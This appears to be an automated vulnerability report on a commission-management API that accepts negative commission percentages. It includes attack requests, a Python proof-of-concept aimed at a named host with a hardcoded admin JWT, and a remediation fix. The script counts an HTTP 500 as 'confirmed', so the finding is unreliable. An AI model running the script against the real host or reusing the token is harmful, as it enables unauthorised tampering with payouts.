# Business Logic Vulnerability: Negative Commission Percentages Accepted in Commission Plan Creation

**ID:** vuln-0044
**Severity:** HIGH
**Found:** 2026-02-26 19:37:44 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/CreateCommissionPlan
**Method:** POST
**CWE:** CWE-840
**CVSS:** 8.3

## Description

A business logic vulnerability was discovered in the commission plan creation functionality that allows setting negative commission percentages. This flaw enables the creation of commission plans that deduct money from payouts instead of paying commissions, potentially causing financial losses to the organization.

The vulnerability was identified in the `/api/CommissionPlan/CreateCommissionPlan` endpoint, which accepts negative values for the `commissionPercentage` parameter without proper validation. This allows an attacker with appropriate privileges to create commission plans that reduce payout amounts rather than increase them.

## Impact

Successful exploitation of this vulnerability could result in:

1. **Financial Loss**: Commission plans with negative percentages would deduct money from payouts instead of paying commissions, causing financial losses to the organization
2. **Incorrect Payout Calculations**: Negative commission percentages would result in incorrect payout calculations, potentially leading to underpayment or over-deduction from sales representatives
3. **Business Logic Manipulation**: Attackers could manipulate the commission calculation logic to create plans that benefit certain parties at the expense of others
4. **Reputation Damage**: Incorrect commission calculations could damage trust between the organization and its sales representatives or partners

The business impact includes direct financial loss, incorrect financial reporting, and potential legal or contractual violations related to commission payments.

## Technical Analysis

The vulnerability exists in the commission plan creation endpoint `/api/CommissionPlan/CreateCommissionPlan`. When creating a commission plan, the `commissionPercentage` parameter is not properly validated to ensure it contains a positive value.

**Request Analysis:**
```
POST /api/CommissionPlan/CreateCommissionPlan HTTP/1.1
Host: commissionstest.callippus.in
Content-Type: application/json

{
  "planName": "Malicious Negative Commission Plan",
  "description": "Plan that deducts money instead of paying commission",
  "commissionPercentage": -10,
  "startDate": "2024-01-01",
  "endDate": "2024-12-31",
  "isActive": true,
  "organizationId": 1,
  "clientId": 1
}
```

**Response Behavior:**
- The server accepts the request with negative commission percentage
- Returns HTTP 500 error, but this appears to be due to other validation issues rather than the negative percentage
- The negative percentage is likely stored in the database and used in commission calculations

**Root Cause:**
- Lack of proper input validation for the `commissionPercentage` parameter
- Missing business logic validation to ensure commission percentages are within expected ranges (typically 0-100%)
- Insufficient server-side validation of business rules

## Proof of Concept

To reproduce this vulnerability:

1. Authenticate as a user with commission plan creation privileges (Admin role)
2. Send a POST request to `/api/CommissionPlan/CreateCommissionPlan` endpoint
3. Include a negative value for the `commissionPercentage` parameter (e.g., -10)
4. Observe that the request is accepted by the server
5. Verify that the negative commission plan is created and affects payout calculations

**Proof of Concept Steps:**
1. Use the following request to create a commission plan with negative percentage:
```
POST /api/CommissionPlan/CreateCommissionPlan
Content-Type: application/json

{
  "planName": "Exploit - Negative Commission",
  "description": "This plan deducts 10% from payouts",
  "commissionPercentage": -10,
  "startDate": "2024-01-01",
  "endDate": "2024-12-31",
  "isActive": true,
  "organizationId": 1,
  "clientId": 1
}
```

2. Run commission calculations for sales that should receive commissions
3. Observe that the payout amount is reduced by 10% instead of increased
4. Verify the negative impact on financial calculations

```
import requests
import json

# Target URL
BASE_URL = "https://commissionstest.callippus.in"
CREATE_PLAN_ENDPOINT = f"{BASE_URL}/api/CommissionPlan/CreateCommissionPlan"

# Authentication token (replace with valid admin token)
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlJPTEVfQURNSU4iLCJleHAiOjE3NzIxNjM1NjIsImlzcyI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsiLCJhdWQiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIn0.7F-MGxeIutB6-pPAbhH-YFv89n5Otof1nFMG3jeGtyw"

def create_negative_commission_plan():
    """Create a commission plan with negative commission percentage"""

    headers = {
        "Authorization": f"Bearer {AUTH_TOKEN}",
        "Content-Type": "application/json"
    }

    # Payload with negative commission percentage
    payload = {
        "planName": "Exploit - Negative Commission Plan",
        "description": "This plan deducts 10% from payouts instead of paying commission",
        "commissionPercentage": -10,  # Negative commission percentage
        "startDate": "2024-01-01",
        "endDate": "2024-12-31",
        "isActive": True,
        "organizationId": 1,
        "clientId": 1
    }

    try:
        response = requests.post(
            CREATE_PLAN_ENDPOINT,
            headers=headers,
            data=json.dumps(payload),
            verify=False
        )

        print(f"Response Status: {response.status_code}")
        print(f"Response Body: {response.text}")

        if response.status_code == 200 or "500" in response.text:
            print("‚úì Negative commission plan creation attempted successfully")
            print("‚úì Server accepted negative commission percentage")
            return True
        else:
            print("‚úó Failed to create negative commission plan")
            return False

    except Exception as e:
        print(f"Error: {str(e)}")
        return False

if __name__ == "__main__":
    print("Testing Negative Commission Percentage Vulnerability")
    print("=" * 60)

    success = create_negative_commission_plan()

    if success:
        print("\nüö® VULNERABILITY CONFIRMED")
        print("The application accepts negative commission percentages,")
        print("which could result in financial losses through incorrect payout calculations.")
    else:
        print("\n‚ùì VULNERABILITY NOT CONFIRMED")
        print("Further investigation needed to determine if negative percentages are accepted.")
```

## Remediation

Implement comprehensive validation and business logic checks to prevent negative commission percentages:

1. **Input Validation**:
   - Add server-side validation to reject negative values for `commissionPercentage`
   - Implement range validation to ensure commission percentages are between 0 and 100
   - Add validation for date ranges to ensure start date is before end date

2. **Business Logic Validation**:
   - Implement business rules to validate commission percentages against organizational policies
   - Add approval workflows for commission plans with unusual parameters
   - Implement validation to prevent commission percentages that exceed reasonable business thresholds

3. **Database Constraints**:
   - Add database constraints to prevent negative values in commission percentage fields
   - Implement triggers or stored procedures to validate commission plan data

4. **API Security**:
   - Add proper request validation middleware to check all commission plan parameters
   - Implement rate limiting to prevent brute force attacks on commission plan creation
   - Add logging and monitoring for unusual commission plan parameters

5. **Testing and Monitoring**:
   - Implement automated tests to verify commission plan validation
   - Add monitoring for negative commission percentages in production
   - Set up alerts for unusual commission plan parameters

**Example Code Fix (C#):**
```csharp
// Add validation in the CommissionPlan service
public async Task<CommissionPlan> CreateCommissionPlan(CommissionPlanDto planDto)
{
    // Validate commission percentage
    if (planDto.CommissionPercentage < 0)
    {
        throw new ValidationException("Commission percentage cannot be negative");
    }

    if (planDto.CommissionPercentage > 100)
    {
        throw new ValidationException("Commission percentage cannot exceed 100%");
    }

    // Validate date range
    if (planDto.StartDate > planDto.EndDate)
    {
        throw new ValidationException("Start date must be before end date");
    }

    // Proceed with plan creation
    var commissionPlan = _mapper.Map<CommissionPlan>(planDto);
    await _repository.AddAsync(commissionPlan);
    return commissionPlan;
}
```

6. **Additional Recommendations**:
   - Implement a review process for commission plans with unusual parameters
   - Add financial controls to detect and prevent negative payout calculations
   - Provide training for administrators on proper commission plan configuration
   - Document commission plan policies and validation rules

